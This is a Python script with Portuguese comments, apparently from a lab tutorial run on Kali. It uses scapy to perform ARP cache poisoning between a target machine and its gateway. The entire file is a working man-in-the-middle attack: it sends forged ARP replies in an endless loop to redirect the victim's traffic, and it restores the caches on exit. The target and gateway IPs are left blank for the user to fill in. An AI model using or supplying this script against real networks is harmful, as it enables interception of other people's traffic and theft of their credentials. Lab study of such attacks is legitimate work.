# arp_poison.py
from scapy.all import Ether, ARP, sendp, getmacbyip
import time
import sys

# --- Configurações do Ataque ---
# Adapte esses IPs com base no Passo 1!
target_ip = " "  # Exemplo: IP da sua máquina física
gateway_ip = " "   # Exemplo: IP do seu roteador real
interface = "eth0"           # Exemplo: Nome da interface do Kali (ex: eth0, enp0s1)

# --- Função para restaurar a cache ARP (IMPORTANTE para limpeza!) ---
def restore_arp(target_ip, gateway_ip, interface):
    print("\n[!] Restaurando caches ARP...")
    # Tenta obter o MAC real do alvo e do gateway.
    # Pode falhar se não houver entradas na cache ou se não conseguir enviar pacotes ARP.
    try:
        target_mac = getmacbyip(target_ip)
        gateway_mac = getmacbyip(gateway_ip)
    except Exception as e:
        print(f"Não foi possível obter MACs reais: {e}. Pode ser necessário reiniciar os dispositivos manualmente.")
        return

    # Pacote para o alvo: diz que o gateway_ip está no gateway_mac real
    packet1 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
    # Pacote para o gateway: diz que o target_ip está no target_mac real
    packet2 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff")

    # Envia várias vezes para garantir que a cache seja atualizada
    sendp(packet1, count=7, inter=1, verbose=0, iface=interface)
    sendp(packet2, count=7, inter=1, verbose=0, iface=interface)
    print("[!] Caches ARP restauradas. Saindo.")

# --- Pacotes ARP Envenenados ---
arp_packet_to_target = ARP(op=2, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip)
arp_packet_to_gateway = ARP(op=2, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip)

print(f"[+] Iniciando ARP Poisoning entre {target_ip} e {gateway_ip} na interface {interface}...")
print("Pressione Ctrl+C para parar e restaurar a cache ARP.")

try:
    while True:
        # Envia o pacote para a vítima
        sendp(arp_packet_to_target, verbose=0, iface=interface)
        # Envia o pacote para o gateway
        sendp(arp_packet_to_gateway, verbose=0, iface=interface)
        # Adiciona um pequeno delay para evitar sobrecarga e permitir que os pacotes sejam processados
        print(".", end="", flush=True) # Feedback visual
        time.sleep(2) # Envia a cada 2 segundos para manter a cache envenenada

except KeyboardInterrupt:
    restore_arp(target_ip, gateway_ip, interface)
except Exception as e:
    print(f"\nErro inesperado: {e}")
    restore_arp(target_ip, gateway_ip, interface)
